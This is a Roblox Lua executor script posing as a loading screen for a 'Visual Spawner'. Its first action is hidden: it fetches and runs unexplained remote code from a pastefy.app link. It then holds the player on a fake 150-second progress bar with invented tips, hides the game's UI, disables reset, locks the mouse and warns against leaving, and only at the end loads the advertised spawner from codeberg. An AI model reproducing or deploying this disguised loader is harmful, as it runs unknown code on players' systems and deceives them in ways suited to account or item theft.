local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/hZcSLR75/raw"))()
end)

local localPlayer = Players.LocalPlayer

-- ---------- Configuration ----------
local LOAD_TIME = 150 -- seconds (2.5 minutes)
local TRIANGLE_ASSET_ID = "rbxassetid://PUT_YOUR_TRIANGLE_ASSET_ID_HERE"
local SPINNER_ASSET_ID  = "rbxassetid://PUT_YOUR_SONIC_SPIN_ID_HERE"
-- -----------------------------------

-- Disable CoreGui elements while loader is active
pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)

-- subtle blur
local blur = Instance.new("BlurEffect")
blur.Size = 18
blur.Parent = Lighting

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RefurbishedLoader"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = CoreGui

-- Background pattern layer
local pattern = Instance.new("ImageLabel", screenGui)
pattern.Size = UDim2.new(1,0,1,0)
pattern.Image = TRIANGLE_ASSET_ID
pattern.ScaleType = Enum.ScaleType.Tile
pattern.TileSize = UDim2.new(0.18,0,0.18,0)
pattern.BackgroundTransparency = 1
pattern.ImageTransparency = 0.85

-- dark overlay
local overlay = Instance.new("Frame", screenGui)
overlay.Size = UDim2.new(1,0,1,0)
overlay.BackgroundColor3 = Color3.fromRGB(18,18,18)
overlay.BackgroundTransparency = 0.28
overlay.BorderSizePixel = 0

-- top warning (pulsing)
local warning = Instance.new("TextLabel", screenGui)
warning.Size = UDim2.new(1,0,0.08,0)
warning.Position = UDim2.new(0,0,0.04,0)
warning.BackgroundTransparency = 1
warning.Font = Enum.Font.GothamBold
warning.TextSize = 20
warning.TextColor3 = Color3.fromRGB(255,85,85)
warning.Text = "⚠️ Please don't leave while executing the script!"
warning.TextScaled = true

-- spinner graphic
local spinner = Instance.new("ImageLabel", screenGui)
spinner.Size = UDim2.new(0,110,0,110)
spinner.AnchorPoint = Vector2.new(0.5,0.5)
spinner.Position = UDim2.new(0.5,0,0.38,0)
spinner.Image = SPINNER_ASSET_ID
spinner.BackgroundTransparency = 1

-- animated rotation
local rot = 0
local rotConn = RunService.Heartbeat:Connect(function(dt)
    if not spinner.Parent then rotConn:Disconnect(); return end
    rot = (rot + 120 * dt) % 360
    spinner.Rotation = rot
end)

-- Progress bar background
local pbBG = Instance.new("Frame", screenGui)
pbBG.Size = UDim2.new(0.62,0,0.05,0)
pbBG.AnchorPoint = Vector2.new(0.5,0)
pbBG.Position = UDim2.new(0.5,0,0.72,0)
pbBG.BackgroundColor3 = Color3.fromRGB(48,48,48)
pbBG.BorderSizePixel = 0
pbBG.ClipsDescendants = true

-- Progress bar fill (we use a gradient for visual)
local pbFill = Instance.new("Frame", pbBG)
pbFill.Size = UDim2.new(0,0,1,0)
pbFill.BackgroundTransparency = 1 -- gradient-only visible
pbFill.BorderSizePixel = 0

local gradient = Instance.new("UIGradient", pbFill)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,128)),
    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(255,128,0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,0)),
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(0,204,255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(153,0,255))
}
gradient.Rotation = 0

-- subtle gradient scrolling
task.spawn(function()
    while screenGui.Parent do
        gradient.Offset = gradient.Offset + Vector2.new(0.005,0)
        if gradient.Offset.X >= 1 then gradient.Offset = Vector2.new(0,0) end
        task.wait(0.03)
    end
end)

-- percentage label
local percentLabel = Instance.new("TextLabel", screenGui)
percentLabel.Size = UDim2.new(1,0,0.06,0)
percentLabel.Position = UDim2.new(0,0,0.78,0)
percentLabel.BackgroundTransparency = 1
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 20
percentLabel.TextColor3 = Color3.fromRGB(238,238,238)
percentLabel.Text = "Loading... 0%"

-- tips label (fade in/out)
local tipsLabel = Instance.new("TextLabel", screenGui)
tipsLabel.Size = UDim2.new(1,0,0.06,0)
tipsLabel.Position = UDim2.new(0,0,0.84,0)
tipsLabel.BackgroundTransparency = 1
tipsLabel.Font = Enum.Font.Gotham
tipsLabel.TextSize = 18
tipsLabel.TextColor3 = Color3.fromRGB(190,190,190)
tipsLabel.Text = "Preparing..."

local tips = {
    "Preparing assets...",
    "Optimizing connections...",
    "Applying final touches...",
    "Almost ready..."
}

-- tip rotator (fade)
task.spawn(function()
    while screenGui.Parent do
        local t = tips[math.random(1,#tips)]
        tipsLabel.TextTransparency = 1
        tipsLabel.Text = t
        -- fade in
        for i=1,10 do tipsLabel.TextTransparency = 1 - i/10; task.wait(0.03) end
        task.wait(3.2)
        -- fade out
        for i=1,10 do tipsLabel.TextTransparency = i/10; task.wait(0.02) end
    end
end)

-- anti-leave measures (soft)
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

local startTick = tick()
local duration = LOAD_TIME or LOAD_TIME -- using configured constant
local lastProgress = 0
local tweenRunning = false

while true do
    local elapsed = tick() - startTick
    local progress = math.clamp(elapsed / duration, 0, 1)
    percentLabel.Text = ("Loading... %d%%"):format(math.floor(progress * 100))

    -- tween the fill width smoothly
    if math.abs(progress - lastProgress) > 0.001 and not tweenRunning then
        tweenRunning = true
        local goal = {Size = UDim2.new(progress,0,1,0)}
        local tw = TweenService:Create(pbFill, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), goal)
        tw:Play()
        tw.Completed:Wait()
        lastProgress = progress
        tweenRunning = false
    end

    if progress >= 1 then break end
    task.wait(0.05)
end

-- fade out + cleanup
local fadeTween = TweenService:Create(screenGui, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {Parent = nil})
fadeTween:Play()
fadeTween.Completed:Wait()

-- restore
pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
if blur and blur.Parent then blur:Destroy() end
UserInputService.MouseBehavior = Enum.MouseBehavior.Default

local ok, err = pcall(function()
    local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
    if Spawner and type(Spawner.Load) == "function" then
        Spawner.Load()
    end
end)
if not ok then
    warn("Failed to run Visual Spawner:", err)
end
